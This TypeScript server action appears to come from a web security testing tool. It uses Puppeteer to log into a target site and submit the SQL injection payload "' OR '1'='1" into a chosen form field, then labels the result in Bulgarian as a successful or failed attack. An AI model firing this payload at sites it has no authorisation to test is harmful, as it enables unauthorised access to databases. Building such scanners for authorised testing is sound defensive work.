"use server";

import puppeteer from "puppeteer";
import { SQLInjectionSchema } from "./models/sql-injection-schema.model";
import { fillLogin } from "@/lib/utils/fill-login.util";
import { openPage } from "@/lib/utils/open-page.util";

export async function submitSQLInjForm(data: SQLInjectionSchema) {
  const { page, browser } = await openPage();

  // Navigate the page to a URL
  await page.goto(data.loginUrl, { waitUntil: "networkidle0" });
  await page.waitForSelector(data.loginFieldSelector);

  await fillLogin(page, data, data.password);

  await page.waitForNetworkIdle();
  await page.goto(data.url, { waitUntil: "networkidle0" });

  if (data.queryType === "select") {
    await page.locator(data.fieldSelector).fill("' OR '1'='1");
    if (data.submitButtonSelector) {
      await page.locator(data.submitButtonSelector).click();
    }

    await page.waitForNetworkIdle();

    const resultElement = await page.$(`::-p-text(${data.resultsString})`);

    await browser.close();

    if (resultElement) {
      return { status: "Неуспешна атака" };
    }

    return {
      status: "Успешна атака",
    };
  }

  await browser.close();

  return {
    status: "Бъдеща разработка",
  };
}
